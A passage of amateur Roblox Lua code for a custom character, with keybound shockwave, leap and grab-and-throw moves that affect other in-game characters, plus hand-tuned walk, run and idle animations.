            l.OutdoorAmbient = Color3.new(0.498039, 0.498039, 0.498039)
        end
        
            local Shockwave = function()
                local rng1 = Instance.new("Part", char)
                rng1.Anchored = true
                rng1.BrickColor = BrickColor.new("Institutional white")
                rng1.CanCollide = false
                rng1.FormFactor = 3
                rng1.Name = "Ring"
                rng1.Size = Vector3.new(1, 1, 1)
                rng1.Transparency = 0.35
                rng1.TopSurface = 0
                rng1.BottomSurface = 0
                local rngm1 = Instance.new("SpecialMesh", rng)
                rngm1.MeshId = "http://www.roblox.com/asset/?id=3270017"
                rngm1.Scale = Vector3.new(10, 10, 1)
                rng1.CFrame = CFrame.new(0, -2, 0) * CFrame.Angles(0, 0, 0)
                local Wave = Instance.new("Part", game.Workspace--[[?]])
                Wave.Name = "Shockwave"
                Wave.BrickColor = BrickColor.new("Institutional white")
                Wave.Size = Vector3.new(1, 1, 1)
                Wave.Shape = "Ball"
                Wave.CanCollide = false
                Wave.Anchored = true
                Wave.TopSurface = 0
                Wave.BottomSurface = 0
                Wave.Touched:connect(function(hit)
                    if hit.Parent:findFirstChild("Humanoid") and hit.Parent:findFirstChild("Torso") then
                        local Occlude = true
                        local NotOccludes = {
                            char.Name;
                            "Wings";
                            "Scythe";
                            "Thingy";
                            "Thingy2"; -- put all of the names in a table pls
                        }
                        for i,v in pairs(NotOccludes) do
                            if hit.Parent.Name == v then
                                Occlude = false
                            end
                        end
                        --if hit.Parent.Name ~= char.Name and hit.Name ~= "Wings" and hit.Name ~= "Scythe" and hit.Name     ~= "Thingy" and hit.Name ~= "Thingy2" and hit.Parent.Name ~= "Wings" and hit.Parent.Name ~= "Scythe" and     hit.Parent.Name ~= "Thingy" and hit.Parent.Name ~= "Thingy2" then
                        if Occlude then
                            hit.Parent:findFirstChild("Humanoid").Health = hit.Parent:findFirstChild("Humanoid").Health - 1
                            hit.Parent:findFirstChild("Torso").Velocity = hit.Parent:findFirstChild("Torso").CFrame.lookVector * -120
                        end
                    end
                end)
                
                Instance.new("SpecialMesh", Wave).MeshType = "Sphere"
                
                coroutine.wrap(function()
                    for i = 1, 20, 0.2 do
                        rngm1.Scale = Vector3.new(10 + i*2, 10 + i*2, 1)
                        rng1.Transparency = i/20
                    wait()
                    end
                    wait()
                    rng1:Destroy()
                end)()
                
                Delay(0, function()

                    if Daytime == false then
                       for i = 1, 50, 1 do
                            Wave.Size = Vector3.new(1 + i, 1 + i, 1 + i)
                            Wave.CFrame = char.Torso.CFrame
                            local t = i / 50
                            Wave.Transparency = t
                            wait()
                        end
                    else
                        for i = 1, 50, 1 do
                            Wave.Size = Vector3.new(1 + i, 1 + i, 1 + i)
                            Wave.CFrame = char.Torso.CFrame
                            local t = i / 50
                            Wave.Transparency = t
                            wait()
                        end
                    end
                    Wave:Destroy()
                end)
                Delay(0, function()
                    while wait() do
                        if Wave ~= nil then
                            Wave.CFrame = char.Torso.CFrame
                        else
                            break
                        end
                    end
                end)
            end
        Shockwave() 
        for i = 1, 15 do
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3.2, .9, 0) * CFrame.Angles(math.rad(120), math.rad(0),     math.rad(-130)), 0.2)
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3.2, .9, 0) * CFrame.Angles(math.rad(120), math.rad(0),     math.rad(70)), 0.2)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, .2) * CFrame.Angles(math.rad(45), math.rad(30), 0), 0.1)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.1, 0) * CFrame.Angles(math.rad(30), math.rad(20),     math.rad(0)), 0.2)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -3, 0) * CFrame.Angles(math.rad(-30), 0, math.rad(-40)), 0.1)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -3, 0) * CFrame.Angles(math.rad(-30), 0, math.rad(0)), 0.1)
            if Debounces.on == false then break end
            wait()
        end
        for i = 1, 15 do
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3, .9, 0) * CFrame.Angles(math.rad(120), math.rad(0),     math.rad(-70)), 0.2)
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, .9, 0) * CFrame.Angles(math.rad(120), math.rad(0),     math.rad(130)), 0.2)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, .2) * CFrame.Angles(math.rad(45), math.rad(-30), 0), 0.1)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.1, 0) * CFrame.Angles(math.rad(30), math.rad(-20),     math.rad(0)), 0.2)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -3, 0) * CFrame.Angles(math.rad(-30), 0, math.rad(0)), 0.1)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -3, 0) * CFrame.Angles(math.rad(-30), 0, math.rad(40)), 0.1)
            if Debounces.on == false then break end
            wait()
        end
        for i = 1, 15 do
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3.2, .9, 0) * CFrame.Angles(math.rad(120), math.rad(0),     math.rad(-130)), 0.2)
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3.2, .9, 0) * CFrame.Angles(math.rad(120), math.rad(0),     math.rad(70)), 0.2)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, .2) * CFrame.Angles(math.rad(45), math.rad(30), 0), 0.1)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.1, 0) * CFrame.Angles(math.rad(30), math.rad(20),     math.rad(0)), 0.2)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -3, 0) * CFrame.Angles(math.rad(-30), 0, math.rad(-40)), 0.1)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -3, 0) * CFrame.Angles(math.rad(-30), 0, math.rad(0)), 0.1)
            if Debounces.on == false then break end
            wait()
        end
        for i = 1, 15 do
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3, .9, 0) * CFrame.Angles(math.rad(120), math.rad(0),     math.rad(-70)), 0.2)
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, .9, 0) * CFrame.Angles(math.rad(120), math.rad(0),     math.rad(130)), 0.2)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, .2) * CFrame.Angles(math.rad(45), math.rad(-30), 0), 0.1)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.1, 0) * CFrame.Angles(math.rad(30), math.rad(-20),     math.rad(0)), 0.2)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -3, 0) * CFrame.Angles(math.rad(-30), 0, math.rad(0)), 0.1)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -3, 0) * CFrame.Angles(math.rad(-30), 0, math.rad(40)), 0.1)
            if Debounces.on == false then break end
            wait()
        end
        for i = 1, 15 do
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3.2, .9, 0) * CFrame.Angles(math.rad(120), math.rad(0),     math.rad(-130)), 0.2)
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3.2, .9, 0) * CFrame.Angles(math.rad(120), math.rad(0),     math.rad(70)), 0.2)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, .2) * CFrame.Angles(math.rad(45), math.rad(30), 0), 0.1)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.1, 0) * CFrame.Angles(math.rad(30), math.rad(20),     math.rad(0)), 0.2)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -3, 0) * CFrame.Angles(math.rad(-30), 0, math.rad(-40)), 0.1)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -3, 0) * CFrame.Angles(math.rad(-30), 0, math.rad(0)), 0.1)
            if Debounces.on == false then break end
            wait()
        end
        for i = 1, 15 do
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3, .9, 0) * CFrame.Angles(math.rad(120), math.rad(0),     math.rad(-70)), 0.2)
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, .9, 0) * CFrame.Angles(math.rad(120), math.rad(0),     math.rad(130)), 0.2)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, .2) * CFrame.Angles(math.rad(45), math.rad(-30), 0), 0.1)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.1, 0) * CFrame.Angles(math.rad(30), math.rad(-20),     math.rad(0)), 0.2)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -3, 0) * CFrame.Angles(math.rad(-30), 0, math.rad(0)), 0.1)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -3, 0) * CFrame.Angles(math.rad(-30), 0, math.rad(40)), 0.1)
            if Debounces.on == false then break end
            wait()
        end
        wait(1.4)
        Debounces.NoIdl = false
        hum.WalkSpeed = 5
        Debounces.on = false
        wait()
        if Debounces.CanAttack == false then
            Debounces.CanAttack = true
            v:Destroy()
            end
        end
    end
end)
----------------------------------------------------
mouse.KeyDown:connect(function(key)
    if key == "m" then
hum.WalkSpeed = 0
        if Debounces.CanAttack == true then
        Debounces.CanAttack = false
        Debounces.on = true
        Debounces.NoIdl = true
            --[[x = Instance.new("Sound",char)
            x.SoundId = "http://www.roblox.com/asset/?id=169445572"
            x.Looped = false
            x.Pitch = 1.1
            x.Volume = 1
            x:Play()
            x2 = Instance.new("Sound",char)
            x2.SoundId = "http://www.roblox.com/asset/?id=169380495"
            x2.Looped = false
            x2.Pitch = .7
            x2.Volume = 1
            wait(.1)
            x:Play()
            x2:Play()
        for i = 1, 20 do
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,0.6,-.2) *CFrame.Angles (math.rad    (45),math.rad(0),math.rad(32)), 0.2)
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3,1,0)*CFrame.Angles(math.rad     (0),math.rad(0),math.rad(-20)), 0.2)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.4)*CFrame.Angles(math.rad (-    8),math.rad(-40), math.rad(-8)),0.2)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -3.2, 0) * CFrame.Angles  (math.rad    (-50), math.rad(40), math.rad(0)), 0.2)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-0.8, .4, -1.6) * CFrame.Angles  (math.rad    (30), 0, math.rad(20)), 0.2)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.6, -2, 0) * CFrame.Angles  (math.rad(-    10), math.rad(-40), math.rad(0)), 0.2)
            cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.3, -1.1) * CFrame.Angles(math.rad(-60), math.rad(-90), math.rad(0)), 0.4)
            if Debounces.on == false then break end
                wait()
            x:Destroy()
            x2:Destroy()
            end
            wait(1)]]--
        local rng = Instance.new("Part", char)
        rng.Anchored = true
        rng.BrickColor = BrickColor.new("Institutional white")
        rng.CanCollide = false
        rng.FormFactor = 3
        rng.Name = "Ring"
        rng.Size = Vector3.new(1, 1, 1)
        rng.Transparency = 0.35
        rng.TopSurface = 0
        rng.BottomSurface = 0
        rng.Position = torso.Position - Vector3.new(0,2,0)
        rng.CFrame = rng.CFrame * CFrame.Angles(math.rad(90), math.rad(0), math.rad(0))
        local rngm = Instance.new("SpecialMesh", rng)
        rngm.MeshId = "http://www.roblox.com/asset/?id=3270017"
        rngm.Scale = Vector3.new(1, 1, 2)
            x = Instance.new("Sound",char)
            x.SoundId = "http://www.roblox.com/asset/?id=169445602"
            x.Looped = false
            x.Pitch = .7
            x.Volume = 1
            x:Play()
                coroutine.wrap(function()
                for i = 1, 60, 2 do
                rngm.Scale = Vector3.new(2 + i*2, 2 + i*2, 1)
                rng.Transparency = i/60
                wait()
                end
                wait()
                rng:Destroy()
                end)()
            hum.WalkSpeed = 50
        BV = Instance.new("BodyVelocity", torso)
        BV.maxForce = Vector3.new(0,200000,0)
        BV.P = 100000
        BV.velocity = Vector3.new(0,800,0)
    for i = 1, 20 do
        hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, 0)*CFrame.Angles(math.rad(20),math.rad(0),     math.rad(0)),0.7)
        torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(math.rad(-16),     math.rad(0), math.rad(0)), 0.7)
        larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3, 1, 0) * CFrame.Angles(math.rad(40), 0,     math.rad(-20)), 0.7)
        rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, 1, 0) * CFrame.Angles(math.rad(-40),     math.rad(0), math.rad(20)), 0.7)
        lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -2, 0) * CFrame.Angles(math.rad(-10), 0, 0), 0.7)
        rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, 0, -2) * CFrame.Angles(math.rad(0), 0, 0), 0.7)
        cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.85, -.9) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
        if Debounces.on == false then break end
        wait()
    end
x:Destroy()
BV:Destroy()
    --[[for i = 1, 30 do
        hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 1.5, 0)*CFrame.Angles(math.rad(-14),math.rad(0),     math.rad(0)),0.3)
        torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1, 0) * CFrame.Angles(math.rad(-16), math.rad    (0), math.rad(0)), 0.3)
        larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(0),     math.rad(0), math.rad(-10)), 0.3)
        rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(0),     math.rad(0), math.rad(10)), 0.3)
        lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-0.5, -.4, -1) * CFrame.Angles(math.rad(20), 0, 0), 0.3)
        rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(0.5, -.8, -.6) * CFrame.Angles(math.rad(-30), 0, 0),     0.3)
        if Debounces.on == false then break end
        wait()
    end]]--
if (torso.Velocity*Vector3.new(1, 1, 1)).magnitude > 1 then
    for i = 1, 30 do
        hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, 0)*CFrame.Angles(math.rad(-14),math.rad(0), math.rad(0)),0.3)
        torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.6, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.3)
        larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3, 1.4, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-90)), 0.3)
        rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, 1.4, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)), 0.3)
        lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.2)
        rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -3, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.2)
        cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.85, -.9) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
        if Debounces.on == false then break end
        wait()
    end
end
Debounces.on = false
Debounces.NoIdl = false
local ry,ht,ps=nil,nil,nil
while ht==nil do
	ry,ht,ps=newRay(root.CFrame*CFrame.new(0,-2,0),root.CFrame*CFrame.new(0,-3,0),4.1,{char})
	wait()
end
z = Instance.new("Sound",char)
z.SoundId = "rbxassetid://142070127"
z.Volume = 1
wait(.1)
z:Play()
Landing()
hum.WalkSpeed = 8
if Debounces.CanAttack == false then
Debounces.CanAttack = true
end
end
end
end)
----------------------------------------------------
Grab = false
mouse.KeyDown:connect(function(key)
    if key == "z" then
    larm.BrickColor = BrickColor.new("Bright red")
    rarm.BrickColor = BrickColor.new("Bright red")
        Debounces.on = true
        Debounces.NoIdl = true
        if Grab == false then
        gp = nil
        con1=larm.Touched:connect(function(hit) -- this is grab
            ht = hit.Parent
            hum1=ht:FindFirstChild('Humanoid')
            if hum1 ~= nil then
                hum1.PlatformStand=true
                gp = ht
                Grab = true
                asd=weld5(larm,ht:FindFirstChild("Torso"),CFrame.new(0,-3.3,0),CFrame.new(0,0,0))
                asd.Parent = larm
                asd.Name = "asd"
                asd.C0=asd.C0*CFrame.Angles(math.rad(-90),0,0)
            elseif hum1 == nil then
                con1:disconnect()
                wait() return
            end
        end)
        for i = 1, 18 do
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,0)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(36)), 0.2)
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.65,.9,-.5)*CFrame.Angles(math.rad(70),math.rad(0),math.rad(20)), 0.2)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2)*CFrame.Angles(math.rad(-14),math.rad(0),0), 0.2)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.8, 0) * CFrame.Angles(math.rad(-60), math.rad(0), 0), 0.2)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, -.6) * CFrame.Angles(math.rad(60), math.rad(0), math.rad(0)), 0.2)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -3, -.6) * CFrame.Angles(math.rad(60), math.rad(0), math.rad(0)), 0.2)
            cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.3, -1.1) * CFrame.Angles(math.rad(-60), math.rad(-90), math.rad(0)), 0.9)
            if Debounces.on == false then break end
            wait()
        end
    con1:disconnect()
    Debounces.on = false
    Debounces.NoIdl = false
    elseif Grab == true then
        Grab = false
    for i = 1, 20 do
        rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,0)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(-20)), 0.2)
        larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.6, .9, -.4)*CFrame.Angles(math.rad(170),math.rad(0),math.rad(-20)), 0.1)
        hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2)*CFrame.Angles(math.rad(-14),math.rad(0),0), 0.2)
        torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(0, math.rad(0), 0), 0.2)
        lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -3, 0) * CFrame.Angles(0, 0, math.rad(-10)), 0.2)
        rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -3, 0) * CFrame.Angles(0, 0, math.rad(10)), 0.2)
        cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
        if Debounces.on == false then end
        wait()
    end
        if gp ~= nil then
        for i,v in pairs(larm:GetChildren()) do
            if v.Name == "asd" and v:IsA("Weld") then
                v:Remove()
            end
        end
        bv = Instance.new("BodyVelocity",gp:FindFirstChild("Torso"))
        bv.maxForce = Vector3.new(400000, 400000, 400000)
        bv.P = 125000
        bv.velocity = char.Head.CFrame.lookVector * 200
        for i = 1, 12 do
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.6, .9, -.75)*CFrame.Angles(math.rad(30),math.rad(0),math.rad(20)), 0.5)
            if Debounces.on == false then end
            wait()
        end
        ht=nil
        Spawn(function()
            wait(0.5)
            bv:Destroy()
        end)
        Debounces.on = false
        Debounces.NoIdl = false
        elseif ht == nil then wait()
        Grab = false
        Debounces.on = false
        Debounces.NoIdl = false
            end
        end
    end
end)
----------------------------------------------------
mouse.KeyDown:connect(function(key)
    if string.byte(key) == 52 then
        char.Humanoid.WalkSpeed = 21
    end
end)
mouse.KeyUp:connect(function(key)
    if string.byte(key) == 52 then
        char.Humanoid.WalkSpeed = 5
    end
end)
----------------------------------------------------
local animpose = "Idle"
local lastanimpose = "Idle"
local sine = 0
local change = 1
local val = 0
local ffing = false
----------------------------------------------------
--[[x = Instance.new("Sound", char)
x.SoundId = "http://www.roblox.com/asset/?id=187922823"
x.Looped = true
x.Volume = 1
x.Pitch = 1
local footsteps = false]]--
-------------------------------
game:GetService("RunService").RenderStepped:connect(function()
--[[if char.Humanoid.Jump == true then
jump = true
else
jump = false
end]]
char.Humanoid.FreeFalling:connect(function(f)
if f then
ffing = true
else
ffing = false
end
end)
sine = sine + change
if jumpn == true then
animpose = "Jumping"
elseif ffing == true then
animpose = "Freefalling"
elseif (torso.Velocity*Vector3.new(1, 0, 1)).magnitude < 2 then
animpose = "Idle"
elseif (torso.Velocity*Vector3.new(1, 0, 1)).magnitude < 20 then
animpose = "Walking"
elseif (torso.Velocity*Vector3.new(1, 0, 1)).magnitude > 20 then
animpose = "Running"
end
if animpose ~= lastanimpose then
sine = 0
if Debounces.NoIdl == false then
if animpose == "Idle" then
for i = 1, 2 do
rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,0)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(20)), 0.2)
larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3,.9,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(-20)), 0.2)
hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2)*CFrame.Angles(math.rad(-14),math.rad(0),0), 0.2)
torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(0, math.rad(0), 0), 0.2)
lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -3, 0) * CFrame.Angles(0, 0, math.rad(-10)), 0.2)
rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -3, 0) * CFrame.Angles(0, 0, math.rad(10)), 0.2)
cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
end
elseif animpose == "Walking" then
for i = 1, 2 do
rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, .9, 0) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(20)), 0.2)
larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3, .9, 0)*CFrame.Angles(0, math.rad(1), math.rad(-10)), 0.2)
hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,0)*CFrame.Angles(math.rad(-8), math.rad(0), math.rad(0)),0.2)
torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(math.rad(-4), 0, math.rad(0)), 0.2)
lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, -.05) * CFrame.Angles(math.rad(-18), 0, 0), .4)
rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -3, -.05) * CFrame.Angles(math.rad(-18), 0, 0), .4)
cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
end
elseif animpose == "Running" then
for i = 1, 2 do
rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, 0.9, .5) * CFrame.Angles(math.rad(-10), math.rad(-40), math.rad(50)), 0.2)
larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3, 1.2, 0-1*math.cos(sine/4)/2)*CFrame.Angles(math.rad(50-80*math.cos(sine/8)/2), math.rad(0), math.rad(0-70*math.cos(sine/8)/2)), 0.2)
hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,0)*CFrame.Angles(math.rad(6+8*math.cos(sine/4)/1.8), math.rad(0), math.rad(0)),0.2)
torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2+0.2*math.cos(sine/4)/2, 0) * CFrame.Angles(math.rad(-14+4*math.cos(sine/4)/2), 0, math.rad(0)), 0.2)
lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3-0.44*math.cos(sine/8)/2.4, -.15 + math.sin(sine/8)/1.5) * CFrame.Angles(math.rad(-20) + -math.sin(sine/8)/1.7, 0, 0), .4)
rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -3+0.44*math.cos(sine/8)/2.4, -.15 + -math.sin(sine/8)/1.5) * CFrame.Angles(math.rad(-20) + math.sin(sine/8)/1.7, 0, 0), .4)
cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.85, -.9) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
end
wait()
end
else
end
end
lastanimpose = animpose
if Debounces.NoIdl == false then
if animpose == "Idle" then
if stanceToggle == "Normal" then
change = 0.5
rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,0)*CFrame.Angles(math.rad(88+2*math.cos(sine/14)),math.rad(0),math.rad(20)), 0.2)
larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3,.9+0.1*math.cos(sine/14),0)*CFrame.Angles(math.rad(50),math.rad(-30),math.rad(-40-2*math.cos(sine/14))), 0.2)
hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2)*CFrame.Angles(math.rad(-14+1*math.cos(sine/14)),math.rad(40),0), 0.2)
torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(0, math.rad(-40), 0), 0.2)
lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.15, -3, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.2)
rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.15, -3, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.2)
cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
elseif stanceToggle == "Sitting" then
rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, .9, 0) * CFrame.Angles(math.rad(100-1*math.cos(sine/14)), math.rad(0), math.rad(20)), 0.2)
larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2, .9, -1)*CFrame.Angles(math.rad(78+1*math.cos(sine/14)), math.rad(0), math.rad(50)), 0.2)
hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, -.3) * CFrame.Angles(math.rad(-14+1*math.cos(sine/14)), math.rad(0), math.rad(0)),0.2)
torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -3, 0) * CFrame.Angles(math.rad(-10+1*math.cos(sine/14)), 0, math.rad(0)), 0.2)
lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -1, -2) * CFrame.Angles(math.rad(-10-1*math.cos(sine/14)), 0, 0), 0.2)
rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -3, .6) * CFrame.Angles(math.rad(-50-1*math.cos(sine/14)), 0, 0), 0.2)
cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.85, -.9) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
end
elseif animpose == "Walking" then
if stanceToggle == "Normal" then
change = 1
rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, .9+.1*math.cos(sine/7), 0) * CFrame.Angles(math.rad(90+2*math.cos(sine/7)), math.rad(0), math.rad(20)), 0.2)
larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3, .9+.1*math.cos(sine/7), -math.sin(sine/14)/2)*CFrame.Angles(math.sin(sine/14)/4, math.rad(1) + -math.sin(sine/14)/2, math.rad(-30)), 0.2)
hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,0)*CFrame.Angles(math.rad(-8+2*math.cos(sine/7)), math.rad(0), math.rad(0)),0.2)
torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2+0.1*math.cos(sine/7), 0) * CFrame.Angles(math.rad(-4+2*math.cos(sine/7)), 0, math.rad(0)), 0.2)
lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3-0.3*math.cos(sine/14)/2, -.05 + math.sin(sine/14)/2) * CFrame.Angles(math.rad(-18) + -math.sin(sine/14)/2.3, 0, 0), .4)
rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -3+0.3*math.cos(sine/14)/2, -.05 + -math.sin(sine/14)/2) * CFrame.Angles(math.rad(-18) + math.sin(sine/14)/2.3, 0, 0), .4)
cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
end
elseif animpose == "Running" then
change = 1
